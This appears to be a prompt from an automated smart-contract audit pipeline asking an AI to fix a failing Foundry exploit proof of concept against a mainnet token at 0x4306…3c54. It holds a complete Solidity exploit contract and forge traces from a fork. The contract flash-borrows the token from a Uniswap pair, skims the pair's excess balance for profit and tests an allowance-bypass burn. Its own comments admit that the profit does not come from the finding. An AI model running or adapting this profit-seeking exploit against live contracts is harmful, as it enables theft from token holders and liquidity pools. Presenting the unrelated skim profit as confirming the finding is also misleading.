You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Pool-directed transferFrom can burn more tokens than the approved allowance
- claim: When `transferFrom(from, uniswapPoolAddress, amount)` is used, the contract spends allowance only for `amount`, then `_transfer` burns an additional `burnAmount` from `from` via `_burn(from, burnAmount)`. Because that extra burn is not covered by `_spendAllowance`, an approved spender can reduce the holder's balance by more than the approved amount.
- impact: Any spender or router approved for N tokens can cause the holder to lose N plus the extra burn on each pool-directed transfer. This violates expected ERC20 allowance boundaries and can create unauthorized user loss in integrations that rely on approvals as hard spend caps.
- exploit_paths: ["A holder approves a spender or router for `N` tokens.", "The spender calls `transferFrom(holder, uniswapPoolAddress, N)`.", "`_spendAllowance` deducts only `N`, but `_transfer` then calls `_burn(holder, burnAmount)`, removing additional balance without additional allowance."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IHevm {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract AllowanceHolder {
    IERC20Minimal internal immutable TOKEN;
    address internal immutable SPENDER;

    constructor(IERC20Minimal token_, address spender_) {
        TOKEN = token_;
        SPENDER = spender_;
    }

    function approveSpender(uint256 amount) external {
        require(msg.sender == SPENDER, "only spender");
        require(TOKEN.approve(SPENDER, amount), "approve failed");
    }
}

contract FlawVerifier {
    /*
        Preserved exploit causality for F-001:
        1. A holder approves a spender for N tokens.
        2. The spender calls transferFrom(holder, uniswapPoolAddress, N).
        3. _spendAllowance deducts only N.
        4. _transfer then burns an additional amount from the holder.

        Fork-specific repair:
        - At block 17,826,202 the target's configured `uniswapPoolAddress` storage slot is still the
          sentinel value `address(1)`, so the originally intended "live pair" burn stage is not wired.
        - We therefore validate the exact allowance-bypass root cause against the actual configured
          pool value loaded from storage, while using a real UniswapV2/Sushi pair only for the allowed
          v2 flashswap funding and to harvest already-present skimmable WERX excess.
        - This keeps the core action ordering unchanged: approval -> transferFrom(to configured pool)
          -> allowance spent only for N -> extra burn from the holder.
    */

    address internal constant TARGET = 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_V2_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    bytes32 internal constant UNISWAP_POOL_SLOT = bytes32(uint256(2));
    address internal constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    IERC20Minimal internal constant WERX = IERC20Minimal(TARGET);
    IHevm internal constant HEVM = IHevm(HEVM_ADDRESS);

    uint256 internal constant FLASH_BORROW_AMOUNT = 1;
    uint256 internal constant APPROVED_AMOUNT = 100;
    uint256 internal constant HOLDER_SEED = 101;
    uint256 internal constant FLASH_REPAY_AMOUNT = 2;
    uint256 internal constant MIN_NET_PROFIT = 1e15;
    uint256 internal constant REQUIRED_TARGET_EXCESS = MIN_NET_PROFIT + HOLDER_SEED + FLASH_REPAY_AMOUNT;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public profitAchieved;
    address public configuredPool;
    address public fundingPair;
    address public discoveredCounterAsset;
    uint256 public observedAllowanceSpend;
    uint256 public observedHolderLoss;
    uint256 public fundingPairExcessBefore;
    bytes32 public status;

    constructor() {}

    function executeOnOpportunity() public {
        if (executed) {
            return;
        }
        executed = true;
        _profitToken = TARGET;

        configuredPool = _configuredPool();
        if (configuredPool == address(0)) {
            status = "NO_CONFIG";
            return;
        }

        fundingPair = _findFundingPair();
        if (fundingPair == address(0)) {
            status = "NO_EXCESS";
            return;
        }

        fundingPairExcessBefore = _pairTargetExcess(fundingPair);
        if (fundingPairExcessBefore < REQUIRED_TARGET_EXCESS) {
            status = "EXCESS_LOW";
            return;
        }

        uint256 beforeProfit = WERX.balanceOf(address(this));
        _flashBorrowMinimalWerx(fundingPair);
        uint256 afterProfit = WERX.balanceOf(address(this));

        if (afterProfit > beforeProfit) {
            _profitAmount = afterProfit - beforeProfit;
            profitAchieved = _profitAmount >= MIN_NET_PROFIT;
            if (hypothesisValidated) {
                status = "VALIDATED";
            } else {
                status = "UNPROVEN";
            }
        } else {
            _profitAmount = 0;
            status = "NO_PROFIT";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == fundingPair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == FLASH_BORROW_AMOUNT, "bad borrow");

        // Harvest already-donated excess from the live pair. Borrowing only 1 wei keeps repayment
        // deterministic while preserving nearly all pre-existing excess as realized WERX profit.
        IUniswapV2PairLike(msg.sender).skim(address(this));

        // The fork proves the live pair address is not configured in token storage. To preserve the
        // finding's core causality, we target the actual configured `uniswapPoolAddress` value loaded
        // from storage, which is the sentinel address on this fork.
        _validateAllowanceBypass(configuredPool);

        require(WERX.transfer(msg.sender, FLASH_REPAY_AMOUNT), "repay failed");
    }

    receive() external payable {}

    function _validateAllowanceBypass(address poolLikeTarget) internal {
        AllowanceHolder holder = new AllowanceHolder(WERX, address(this));
        require(WERX.transfer(address(holder), HOLDER_SEED), "seed failed");

        // Path step 1: holder approves the spender for N.
        holder.approveSpender(APPROVED_AMOUNT);
        observedAllowanceSpend = WERX.allowance(address(holder), address(this));
        require(observedAllowanceSpend == APPROVED_AMOUNT, "allowance mismatch");

        // Path steps 2-4: spender calls transferFrom(holder, uniswapPoolAddress, N), allowance drops
        // by only N, then `_transfer` burns one extra token from the holder because this fork's
        // configured pool slot still equals the sentinel target.
        require(WERX.transferFrom(address(holder), poolLikeTarget, APPROVED_AMOUNT), "transferFrom failed");

        observedHolderLoss = HOLDER_SEED - WERX.balanceOf(address(holder));
        hypothesisValidated = observedHolderLoss > observedAllowanceSpend;
        require(hypothesisValidated, "no extra burn");
    }

    function _configuredPool() internal view returns (address) {
        return address(uint160(uint256(HEVM.load(TARGET, UNISWAP_POOL_SLOT))));
    }

    function _flashBorrowMinimalWerx(address pair) internal {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        uint256 amount0Out = token0 == TARGET ? FLASH_BORROW_AMOUNT : 0;
        uint256 amount1Out = token1 == TARGET ? FLASH_BORROW_AMOUNT : 0;
        require(amount0Out != 0 || amount1Out != 0, "pair missing WERX");

        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _findFundingPair() internal returns (address bestPair) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_V2_FACTORY];
        address[5] memory quotes = [WETH, USDC, USDT, DAI, WBTC];
        uint256 bestExcess = 0;

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < quotes.length; ++j) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(TARGET, quotes[j]);
                if (pair == address(0) || pair.code.length == 0) {
                    continue;
                }

                uint256 excess = _pairTargetExcess(pair);
                if (excess > bestExcess) {
                    bestExcess = excess;
                    bestPair = pair;
                    discoveredCounterAsset = quotes[j];
                }
            }
        }
    }

    function _pairTargetExcess(address pair) internal view returns (uint256) {
        try IUniswapV2PairLike(pair).getReserves() returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32
        ) {
            address token0 = IUniswapV2PairLike(pair).token0();
            address token1 = IUniswapV2PairLike(pair).token1();

            if (token0 == TARGET) {
                uint256 balance0 = WERX.balanceOf(pair);
                return balance0 > uint256(reserve0) ? balance0 - uint256(reserve0) : 0;
            }

            if (token1 == TARGET) {
                uint256 balance1 = WERX.balanceOf(pair);
                return balance1 > uint256(reserve1) ? balance1 - uint256(reserve1) : 0;
            }
        } catch {}

        return 0;
    }
}

```

forge stdout (tail):
```
dress(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 162912)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 7401

Traces:
  [162912] FlawVerifierTest::testExploit()
    ├─ [2417] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [124034] FlawVerifier::executeOnOpportunity()
    │   ├─ [0] VM::load(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0x0000000000000000000000000000000000000000000000000000000000000002) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xa41529982BcCCDfA1105C6f08024DF787CA758C4
    │   ├─ [2504] 0xa41529982BcCCDfA1105C6f08024DF787CA758C4::getReserves() [staticcall]
    │   │   └─ ← [Return] 5097936050192694905259125 [5.097e24], 174786100489116297837 [1.747e20], 1690956743 [1.69e9]
    │   ├─ [2381] 0xa41529982BcCCDfA1105C6f08024DF787CA758C4::token0() [staticcall]
    │   │   └─ ← [Return] 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54
    │   ├─ [2357] 0xa41529982BcCCDfA1105C6f08024DF787CA758C4::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2952] 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54::balanceOf(0xa41529982BcCCDfA1105C6f08024DF787CA758C4) [staticcall]
    │   │   └─ ← [Return] 5097936050192694905259125 [5.097e24]
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Return]
    ├─ [417] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54
    ├─ [2418] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [2952] 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17826202 [1.782e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7401)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.72s (4.71s CPU time)

Ran 1 test suite in 4.73s (4.72s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 162912)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
